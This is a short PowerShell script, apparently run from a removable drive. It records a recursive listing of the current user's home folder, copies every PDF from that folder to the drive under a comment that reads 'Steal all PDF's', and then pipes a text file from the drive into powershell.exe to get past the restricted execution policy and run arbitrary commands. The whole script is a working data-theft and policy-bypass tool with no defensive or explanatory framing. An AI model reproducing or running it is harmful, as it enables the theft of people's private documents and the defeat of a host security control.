$User=$env:UserName
$Domain=$env:UserDomain
$Storage="J:\$Domain\$User"
cd J:
mkdir $Domain
cd $Domain
mkdir $User



#List and record all files
Get-ChildItem -Recurse C:\Users\$User > $Storage\Current_File_List.txt

# Steal all PDF's
Get-Childitem C:\Users\$User -recurse -filter "*.pdf" | %{Copy-Item -Path $_.FullName -Destination $Storage}

#Bypass Restricted Execution Policy and launch Today's commands
cat J:\todays-commands.txt | powershell.exe



